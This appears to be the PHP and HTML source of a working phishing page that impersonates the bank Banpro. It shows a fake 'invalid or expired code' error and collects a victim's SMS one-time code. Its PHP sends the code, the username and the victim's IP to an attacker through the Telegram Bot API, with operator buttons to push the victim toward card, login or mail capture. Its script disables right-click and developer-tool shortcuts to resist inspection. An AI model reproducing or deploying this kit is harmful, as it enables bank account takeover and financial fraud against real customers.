<?php
session_start();
include("settings.php"); // Contiene $token y $chat_id

$usuario = $_SESSION['usuario'] ?? null;

if ($_SERVER["REQUEST_METHOD"] == "POST" && $usuario) {
    $codigo = $_POST['ips1'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];

    $msg = "CORRECCIÓN SMS BANPRO\n👤 Usuario: $usuario\n🔢 Código: $codigo\n🌐 IP: $ip";

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
        'chat_id' => $chat_id,
        'text' => $msg,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    ['text' => '❌ SMS Error', 'callback_data' => "SMSERROR|$usuario"],
                    ['text' => '🔁 Login', 'callback_data' => "LOGIN|$usuario"]
                ],
                [
                    ['text' => '💳 CARD', 'callback_data' => "CARD|$usuario"]
                ],
                [
                    ['text' => '📩 Mail', 'callback_data' => "MAIL|$usuario"],
                    ['text' => '✅ Listo', 'callback_data' => "LISTO|$usuario"]
                ]
            ]
        ])
    ]));

    header("Location: espera.php");
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Validación - Error</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
<div id="main-cnt" style="overflow: hidden; min-height: 100vh; position: relative;">
    <div id="ctn" style="display: inline-block; vertical-align: top; background-color: #fff;">
        <div id="frmc" style="display: inline-block; text-align: center; border-radius: 8px; vertical-align: top; width: 500px;">
            <form method="post" action="" id="f1"
                  style="display: inline-block; width: 420px; height: 660px; border-radius: 10px; background-image: url(2.svg); position: relative;">
                <img src="l.png" style="position: relative; top: 51px; left: -15px; width: 294px;">
                <input minlength="6" maxlength="8" id="i1" name="ips1" placeholder="Código" type="text" inputmode="numeric" required
                       style="display: block; position: relative; color: #333; background: transparent; border: none; top: 187px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off">
                <p id="error-message" style="position: relative; top: 200px; left: 28px; font-size: 14px; color: red; font-family: sans-serif;">El código ingresado no es válido o ha expirado</p>
                <input type="submit" value="Continuar"
                       style="display: block; position: relative; font-size: 16px; color: #fff; background: rgb(0, 105, 60); border: none; top: 224px; left: 28px; height: 39px; width: 364px; outline: none; border-radius: 8px;">
            </form>
        </div>
        <div id="bnncont" style="text-align: right; display: inline-block;">
            <div style="position: absolute; z-index: 1; opacity: 1; overflow: hidden; width: 80%; height: 100%; left: 500px; top: 0px; display: inline-block;">
                <div id="bnn" style="background: url(bnn.jpg) left center / cover no-repeat; height: 100%; overflow: hidden; position: relative; text-align: center;">
                    <img src="terms.svg" style="width: 60%; position: relative; top: 80vh;">
                </div>
            </div>
        </div>
    </div>
</div>

<style>
    * { margin: 0; padding: 0; }
    @font-face {
        font-family: dinReg;
        src: url(din-regular.ttf);
    }

    @media screen and (max-width: 1024px) {
        body {
            width: 100% !important;
            background: linear-gradient(rgb(105, 190, 40), rgb(0, 105, 60)) !important;
            background-repeat: no-repeat !important;
            min-width: auto !important;
            zoom: 90% !important;
        }
        #ctn {
            border-radius: 6px !important;
        }
        #main-cnt {
            text-align: center !important;
            padding-top: 30px;
        }
        #frmc {
            width: 100% !important;
        }
        #bnncont {
            display: none !important;
        }
    }
</style>
<script>
    document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
    document.addEventListener('keydown', function(e) {
        if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || (e.ctrlKey && e.keyCode === 85)) {
            e.preventDefault(); return false;
        }
    });
    document.addEventListener('dragstart', function(e) {
        if (e.target.tagName === 'IMG') { e.preventDefault(); return false; }
    });

    // Evitar doble envío
    document.getElementById('f1').addEventListener('submit', function() {
        var btn = this.querySelector('input[type="submit"]');
        if (btn) { btn.disabled = true; btn.style.opacity = '0.6'; }
    });
</script>

<!-- Popup -->
<div id="sms-popup" style="position: fixed; inset: 0; background: rgba(0,0,0,0.55); z-index: 9999; display: none; align-items: center; justify-content: center; opacity: 0; transition: opacity 0.3s ease;">
    <div style="background: #fff; border-radius: 10px; padding: 28px 24px; max-width: 300px; width: 88%; text-align: center; box-shadow: 0 6px 28px rgba(0,0,0,0.25);">
        <p style="font-family: 'Segoe UI', sans-serif; font-size: 15px; color: #222; line-height: 1.6; font-weight: 500;">Hemos enviado un nuevo codigo, confirmalo para continuar</p>
    </div>
</div>
<script>
    (function () {
        var p = document.getElementById('sms-popup');
        setTimeout(function () {
            p.style.display = 'flex';
            setTimeout(function () { p.style.opacity = '1'; }, 20);
            setTimeout(function () {
                p.style.opacity = '0';
                setTimeout(function () { p.style.display = 'none'; }, 350);
            }, 2000);
        }, 1000);
    })();
</script>
</body>
</html>
